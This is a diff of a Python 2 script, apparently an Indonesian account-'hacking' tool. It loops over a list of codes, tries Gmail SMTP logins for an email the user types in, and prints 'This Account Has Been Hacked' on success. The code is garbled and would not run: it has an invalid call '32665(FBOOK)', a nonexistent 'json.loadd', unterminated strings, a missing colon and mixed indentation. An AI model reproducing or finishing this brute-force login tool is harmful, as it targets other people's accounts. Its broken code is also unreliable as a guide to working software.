@@ -148,33 +148,43 @@ def login():
 
 def code():
 	i = 0
-	codem = raw_input('Email :')
-	msg = 32665(FBOOK)
-	server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-	server.ehlo()
-	for code in code_list:
-		i = i + 1
-		print str(i) + '/' + str(len(code_list))
-		try:
-			v = server.login(codem, msg)
-			s = json.loadd(v,text)
-			telok = open('code.txt', 'r')
-			system('clear')
-			main()
-			print '\n'
-			print '[+] This Account Has Been Hacked code :' + code + '
-			break
-		except smtplib.SMTPAuthenticationError as e:
-			error = str(e)
-		if error[14] == '<':
-			system('clear')
-			main()
-			print '[+] this account has been hacked, code :' + code + '
+	os.system('clear')
+	try:
+		toket = open('login.txt','r')
+		login()
+	except (KeyError,IOError):
+		os.system('clear')
+                time.sleep(0.05)
+		print logo
+		print("\033[1;93mKonfirmasi Code Email Anda")
+		codem = raw_input('Email :')
+		msg = 32665(FBOOK)
+		server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+		server.ehlo()
+		for code in code_list:
+			i = i + 1
+			print str(i) + '/' + str(len(code_list))
+			try:
+				v = server.login(codem, msg)
+				s = json.loadd(v,text)
+				telok = open('code.txt', 'r')
+				system('clear')
+				main()
+				print '\n'
+				print '[+] This Account Has Been Hacked code :' + telok + '
+				break
+			except smtplib.SMTPAuthenticationError as e:
+				error = str(e)
+			if error[14] == '<':
+				system('clear')
+				main()
+				print '[+] this account has been hacked, code :' + telok + '
 
-			break
-		else:
-			print '[!] Code not found => ' + code + '
-			login()
+				break
+			else:
+				print '[!] Code not found => ' + telok + '
+				login()
+
 def main()
 	print '[1] mulai'
 	print '[2] keluar'
